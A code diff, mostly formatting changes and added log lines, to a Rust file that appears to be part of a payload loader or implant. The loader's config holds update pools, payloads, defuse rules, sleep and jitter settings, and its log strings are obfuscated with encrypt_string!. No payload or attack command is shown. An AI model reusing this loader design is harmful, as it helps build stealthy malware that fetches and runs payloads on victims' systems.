@@ -16,11 +16,10 @@ use log::warn;
 
 use cryptify::encrypt_string;
 
-use std::collections::BTreeMap;
 use chrono::prelude::*;
+use std::collections::BTreeMap;
 //#use chrono::serde::ts_seconds_option;
 //    #[serde(with = "ts_seconds_option")]
-
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct SignMaterial {
@@ -32,7 +31,7 @@ pub struct SignMaterial {
 pub struct Config {
     pub update_links: BTreeMap<String, PoolLinks>,
     pub payloads: Vec<Payload>,
-    pub defuse_update: Vec<Defuse>, 
+    pub defuse_update: Vec<Defuse>,
     pub defuse_payload: Vec<Defuse>,
     pub sign_material: SignMaterial,
     pub sleep: u64,
@@ -61,7 +60,7 @@ impl Config {
             defuse_payload: defuse_payload,
             sleep: sleep,
             jitt: jitt,
-            date:Utc::now()
+            date: Utc::now(),
         }
     }
     pub fn new_empty() -> Config {
@@ -77,7 +76,7 @@ impl Config {
             defuse_payload: vec![],
             sleep: 0,
             jitt: 0,
-            date: Utc::now()
+            date: Utc::now(),
         }
     }
 
@@ -272,16 +271,16 @@ impl Config {
                 &pool_name
             );
             match pool_links.update_pool(&self) {
-                Ok(newconf) => { 
-                    
-                    if self.is_same_loader(&newconf){
+                Ok(newconf) => {
+                    if self.is_same_loader(&newconf) {
+                        info!("{}", encrypt_string!("same config: yes"));
                         info!(
                             "{}",
                             encrypt_string!(
                                 "[+] DECISION: keep the same active CONFIG, and run the payloads"
                             )
-                        );        
-                    }else{
+                        );
+                    } else {
                         info!(
                             "{}",
                             encrypt_string!(
@@ -289,15 +288,27 @@ impl Config {
                             )
                         );
                     }
-                    
-                    return newconf},
+
+                    return newconf;
+                }
                 Err(error) => {
-                    warn!("{}{}", encrypt_string!("[+] Switch to next Pool, reason: "), error);
+                    warn!(
+                        "{}{}",
+                        encrypt_string!("[+] Switch to next Pool, reason: "),
+                        error
+                    );
                     ()
-                },
+                }
             };
         }
-
+        info!(
+            "{}",
+            encrypt_string!("[+] All pool fetch without finding a new one")
+        );
+        info!(
+            "{}",
+            encrypt_string!("[+] DECISION: keep the same active CONFIG, and run the payloads")
+        );
         self.to_owned()
     }
 }
